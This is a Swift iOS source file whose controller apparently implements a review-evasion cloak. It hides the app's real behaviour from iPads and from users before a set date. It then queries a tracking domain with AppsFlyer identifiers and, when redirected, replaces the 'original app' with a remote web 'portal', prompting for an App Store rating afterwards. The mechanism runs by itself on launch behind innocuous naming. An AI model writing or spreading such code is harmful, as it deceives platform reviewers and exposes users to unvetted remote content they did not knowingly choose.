import Foundation
import Combine
import UIKit
import StoreKit
import AppsFlyerLib

class RainFlowController: ObservableObject {
    static let shared = RainFlowController()
    
    @Published var rainDisplayMode: RainDisplayState = .preparing
    @Published var rainCachedEndpoint: String? = nil
    @Published var rainIsLoading = true
    
    private var rainIsRefreshingFromRemote = false
    
    private let rainRemoteConfigEndpoint = "https://coupleofglass.com/cpk5yKDm"
    
    private let rainPersistentStateKey = "rain_persistent_state_v1"
    private let rainSecuredEndpointKey = "rain_secured_endpoint_v1"
    private let rainExtractedIdentifierKey = "rain_extracted_id_v1"
    private let rainWebViewShownKey = "rain_webview_shown"
    private let rainRatingShownKey = "rain_rating_shown"
    private let rainDateCheckKey = "rain_date_check"
    
    private var rainAppsFlyerUID: String = ""
    private var rainAppsFlyerConversionData: [AnyHashable: Any] = [:]
    
    private var rainSavedPathId: String? {
        get { UserDefaults.standard.string(forKey: rainExtractedIdentifierKey) }
        set { UserDefaults.standard.set(newValue, forKey: rainExtractedIdentifierKey) }
    }
    
    private var rainFallbackState: Bool {
        get { UserDefaults.standard.bool(forKey: rainPersistentStateKey) }
        set { UserDefaults.standard.set(newValue, forKey: rainPersistentStateKey) }
    }
    
    private var rainWebViewShown: Bool {
        get { UserDefaults.standard.bool(forKey: rainWebViewShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: rainWebViewShownKey) }
    }
    
    private var rainRatingShown: Bool {
        get { UserDefaults.standard.bool(forKey: rainRatingShownKey) }
        set { UserDefaults.standard.set(newValue, forKey: rainRatingShownKey) }
    }
    
    private init() {
        self.rainCachedEndpoint = rainSecureRetrieveEndpoint()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.rainRunInitializationSequence()
        }
    }
    
    private func rainRunInitializationSequence() {
        rainPerformInitialValidations()
    }
    
    private func rainPerformInitialValidations() {
        guard rainValidateDeviceType() else { return }
        
        guard rainValidateTemporalCondition() else { return }
        
        guard rainCheckPersistentState() else { return }
        
        if let endpoint = rainSecureRetrieveEndpoint(), !endpoint.isEmpty {
            rainActivatePrimaryMode()
            rainValidateEndpointInBackground(endpoint)
            return
        }
        
        print("⏳ [RainFlowController] No cached endpoint - waiting for AppsFlyer conversion data...")
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) { [weak self] in
            guard let self = self else { return }
            
            if self.rainDisplayMode == .preparing && !self.rainFallbackState && !self.rainWebViewShown {
                print("⚠️ [RainFlowController] AppsFlyer timeout - making request without conversion data")
                
                self.rainAppsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
                print("🔑 [RainFlowController] UID after timeout: \(self.rainAppsFlyerUID), length: \(self.rainAppsFlyerUID.count)")
                
                self.rainFetchRemoteConfiguration()
            }
        }
    }
    
    private func rainValidateDeviceType() -> Bool {
        if UIDevice.current.model == "iPad" {
            rainActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func rainValidateTemporalCondition() -> Bool {
        let rainFormatter = DateFormatter()
        rainFormatter.dateFormat = "dd.MM.yyyy"
        if let rainThreshold = rainFormatter.date(from: "15.01.2025"),
           Date() < rainThreshold {
            rainActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func rainCheckPersistentState() -> Bool {
        if rainFallbackState {
            rainActivateSecondaryMode()
            return false
        }
        return true
    }
    
    private func rainSecureStoreEndpoint(_ newValue: String?) {
        guard let rainEndpoint = newValue else {
            UserDefaults.standard.removeObject(forKey: rainSecuredEndpointKey)
            print("📝 [RainFlowController] Endpoint removed from storage")
            DispatchQueue.main.async { self.rainCachedEndpoint = nil }
            return
        }
        
        if let rainTransformed = RainDataProcessor.rainTransform(rainEndpoint) {
            UserDefaults.standard.set(rainTransformed, forKey: rainSecuredEndpointKey)
            print("📝 [RainFlowController] Endpoint transformed and stored")
        } else {
            UserDefaults.standard.set(rainEndpoint, forKey: rainSecuredEndpointKey)
            print("⚠️ [RainFlowController] Transform failed, storing plain (fallback)")
        }
        
        DispatchQueue.main.async { self.rainCachedEndpoint = rainEndpoint }
    }
    
    private func rainSecureRetrieveEndpoint() -> String? {
        guard let rainStored = UserDefaults.standard.string(forKey: rainSecuredEndpointKey) else {
            print("📝 [RainFlowController] No endpoint found in storage")
            return nil
        }
        
        if let rainRestored = RainDataProcessor.rainRestore(rainStored) {
            print("📝 [RainFlowController] Endpoint restored successfully")
            return rainRestored
        }
        
        if rainStored.hasPrefix("http") {
            print("⚠️ [RainFlowController] Using plain stored value (fallback)")
            return rainStored
        }
        
        print("❌ [RainFlowController] Failed to retrieve endpoint")
        return nil
    }
    
    func rainUpdateAppsFlyerData(rainUid: String, rainConversionData: [AnyHashable: Any] = [:]) {
        self.rainAppsFlyerUID = rainUid
        self.rainAppsFlyerConversionData = rainConversionData
        
        if rainFallbackState {
            print("⚪ [RainFlowController] Fallback state is true - skipping AppsFlyer update")
            return
        }
        
        if rainWebViewShown {
            print("🌐 [RainFlowController] WebView already shown - keeping current state")
            return
        }
        
        if rainCachedEndpoint == nil || rainCachedEndpoint?.isEmpty == true {
            rainFetchRemoteConfiguration()
        }
    }
    
    private func rainFetchRemoteConfiguration() {
        let rainTargetURL = RainURLConstructor.rainBuildURL(
            rainAppsFlyerUID: rainAppsFlyerUID,
            rainConversionData: rainAppsFlyerConversionData
        )
        
        print("🔗 [RainFlowController] Config URL: \(rainTargetURL)")
        
        guard let rainURL = URL(string: rainTargetURL) else {
            print("❌ [RainFlowController] Invalid config URL - showing white mode")
            rainActivateSecondaryMode()
            return
        }
        
        var rainRequest = URLRequest(url: rainURL)
        rainRequest.timeoutInterval = 10.0
        rainRequest.httpMethod = "GET"
        
        print("📡 [RainFlowController] Making request...")
        
        URLSession.shared.dataTask(with: rainRequest) { [weak self] rainData, rainResponse, rainError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                if let rainError = rainError {
                    print("❌ [RainFlowController] Network error: \(rainError.localizedDescription)")
                    self.rainActivateSecondaryMode()
                    return
                }
                
                if let rainHttpResponse = rainResponse as? HTTPURLResponse {
                    print("📊 [RainFlowController] HTTP Status: \(rainHttpResponse.statusCode)")
                    print("🔗 [RainFlowController] Response URL: \(rainHttpResponse.url?.absoluteString ?? "nil")")
                    
                    if rainHttpResponse.statusCode > 403 {
                        print("❌ [RainFlowController] HTTP error \(rainHttpResponse.statusCode) - showing white mode")
                        self.rainActivateSecondaryMode()
                        return
                    }
                    
                    if let rainFinalURL = rainHttpResponse.url?.absoluteString {
                        print("🎯 [RainFlowController] Final URL after redirects: \(rainFinalURL)")
                        
                        if rainFinalURL != rainTargetURL {
                            print("✅ [RainFlowController] URL changed after redirect - saving and showing WebView")
                            
                            self.rainExtractAndSavePathId(from: rainFinalURL)
                            
                            self.rainIsRefreshingFromRemote = true
                            
                            self.rainSecureStoreEndpoint(rainFinalURL)
                            self.rainActivatePrimaryMode()
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.rainIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [RainFlowController] Unexpected response - showing white mode")
                self.rainActivateSecondaryMode()
            }
        }.resume()
    }
    
    private func rainValidateEndpointInBackground(_ rainUrl: String) {
        print("🔍 [RainFlowController] Validating saved URL in background: \(rainUrl)")
        
        guard let rainValidationURL = URL(string: rainUrl) else {
            print("❌ [RainFlowController] Invalid saved URL format - fetching new with pathid")
            rainFetchConfigurationWithPathId()
            return
        }
        
        var rainValidationRequest = URLRequest(url: rainValidationURL)
        rainValidationRequest.timeoutInterval = 10.0
        rainValidationRequest.httpMethod = "HEAD"
        
        URLSession.shared.dataTask(with: rainValidationRequest) { [weak self] _, rainValidationResponse, rainValidationError in
            guard let self = self else { return }
            
            if let rainValidationError = rainValidationError {
                print("❌ [RainFlowController] Validation network error: \(rainValidationError.localizedDescription)")
                self.rainFetchConfigurationWithPathId()
                return
            }
            
            if let rainValidationHttpResponse = rainValidationResponse as? HTTPURLResponse {
                print("📊 [RainFlowController] Validation HTTP Status: \(rainValidationHttpResponse.statusCode)")
                
                if rainValidationHttpResponse.statusCode >= 200 && rainValidationHttpResponse.statusCode <= 403 {
                    print("✅ [RainFlowController] Saved URL is valid (status \(rainValidationHttpResponse.statusCode))")
                    return
                } else if rainValidationHttpResponse.statusCode > 403 {
                    print("❌ [RainFlowController] Saved URL is dead (status \(rainValidationHttpResponse.statusCode)) - fetching new with pathid")
                    self.rainFetchConfigurationWithPathId()
                    return
                }
            }
            
            print("❌ [RainFlowController] Unexpected validation response - fetching new with pathid")
            self.rainFetchConfigurationWithPathId()
        }.resume()
    }
    
    private func rainFetchConfigurationWithPathId() {
        guard let rainPathId = rainSavedPathId, !rainPathId.isEmpty else {
            print("❌ [RainFlowController] No saved pathId - showing empty WebView")
            rainActivatePrimaryMode()
            return
        }
        
        let rainUrlWithPathId = "\(rainRemoteConfigEndpoint)?pathid=\(rainPathId)"
        print("🔗 [RainFlowController] Config URL with pathId: \(rainUrlWithPathId)")
        
        guard let rainPathIdURL = URL(string: rainUrlWithPathId) else {
            print("❌ [RainFlowController] Invalid config URL with pathId - showing empty WebView")
            rainActivatePrimaryMode()
            return
        }
        
        var rainPathIdRequest = URLRequest(url: rainPathIdURL)
        rainPathIdRequest.timeoutInterval = 10.0
        rainPathIdRequest.httpMethod = "GET"
        
        print("📡 [RainFlowController] Making request to Keitaro with pathId...")
        
        URLSession.shared.dataTask(with: rainPathIdRequest) { [weak self] rainPathIdData, rainPathIdResponse, rainPathIdError in
            DispatchQueue.main.async {
                guard let self = self else { return }
                
                if let rainPathIdError = rainPathIdError {
                    print("❌ [RainFlowController] Network error with pathId: \(rainPathIdError.localizedDescription)")
                    self.rainActivatePrimaryMode()
                    return
                }
                
                if let rainPathIdHttpResponse = rainPathIdResponse as? HTTPURLResponse {
                    print("📊 [RainFlowController] HTTP Status with pathId: \(rainPathIdHttpResponse.statusCode)")
                    
                    if rainPathIdHttpResponse.statusCode > 403 {
                        print("❌ [RainFlowController] HTTP error \(rainPathIdHttpResponse.statusCode) with pathId - showing empty WebView")
                        self.rainActivatePrimaryMode()
                        return
                    }
                    
                    if let rainPathIdFinalURL = rainPathIdHttpResponse.url?.absoluteString {
                        print("🎯 [RainFlowController] Final URL after redirects with pathId: \(rainPathIdFinalURL)")
                        
                        if rainPathIdFinalURL != rainUrlWithPathId {
                            print("✅ [RainFlowController] URL changed after redirect with pathId - saving and showing WebView")
                            
                            self.rainIsRefreshingFromRemote = true
                            self.rainSecureStoreEndpoint(rainPathIdFinalURL)
                            self.rainActivatePrimaryMode()
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                                self.rainIsRefreshingFromRemote = false
                            }
                            return
                        }
                    }
                }
                
                print("❌ [RainFlowController] Unexpected response with pathId - showing empty WebView")
                self.rainActivatePrimaryMode()
            }
        }.resume()
    }
    
    private func rainExtractAndSavePathId(from rainUrl: String) {
        guard let rainUrlComponents = URLComponents(string: rainUrl),
              let rainQueryItems = rainUrlComponents.queryItems else {
            print("⚠️ [RainFlowController] Could not parse URL components from: \(rainUrl)")
            return
        }
        
        for rainQueryItem in rainQueryItems {
            if rainQueryItem.name.lowercased() == "pathid", let rainPathIdValue = rainQueryItem.value {
                print("🔑 [RainFlowController] Found pathId: \(rainPathIdValue)")
                rainSavedPathId = rainPathIdValue
                return
            }
        }
        
        print("⚠️ [RainFlowController] No pathId parameter found in URL: \(rainUrl)")
    }
    
    private func rainActivateSecondaryMode() {
        print("⚪ [RainFlowController] Setting WHITE mode - showing original app")
        DispatchQueue.main.async {
            self.rainDisplayMode = .original
            self.rainFallbackState = true
            self.rainIsLoading = false
        }
    }
    
    private func rainActivatePrimaryMode() {
        print("🌐 [RainFlowController] Setting WEBVIEW mode - showing portal")
        DispatchQueue.main.async {
            self.rainDisplayMode = .webContent
            self.rainIsLoading = false
            
            if self.rainWebViewShown && !self.rainRatingShown {
                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                    self.rainShowSystemRatingAlert()
                }
            }
            
            self.rainWebViewShown = true
        }
    }
    
    func rainGetCurrentURL() -> String? {
        return rainSecureRetrieveEndpoint()
    }
    
    func rainUpdateURL(_ rainNewURL: String) {
        print("🔄 [RainFlowController] URL update attempt: \(rainNewURL)")
        
        if rainIsRefreshingFromRemote {
            print("🚫 [RainFlowController] Blocking URL update - currently updating from remote")
            return
        }
        
        if rainNewURL != rainRemoteConfigEndpoint && !rainNewURL.contains("coupleofglass.com") && rainNewURL != rainGetCurrentURL() {
            print("💾 [RainFlowController] Saving new URL: \(rainNewURL)")
            rainSecureStoreEndpoint(rainNewURL)
        } else {
            print("⏭️ [RainFlowController] Skipping URL save (tracking domain, same as config, or already saved)")
        }
    }
    
    private func rainShowSystemRatingAlert() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
            if let rainWindowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                SKStoreReviewController.requestReview(in: rainWindowScene)
                self.rainRatingShown = true
            }
        }
    }
    
    enum RainDisplayState {
        case preparing
        case original
        case webContent
    }
}
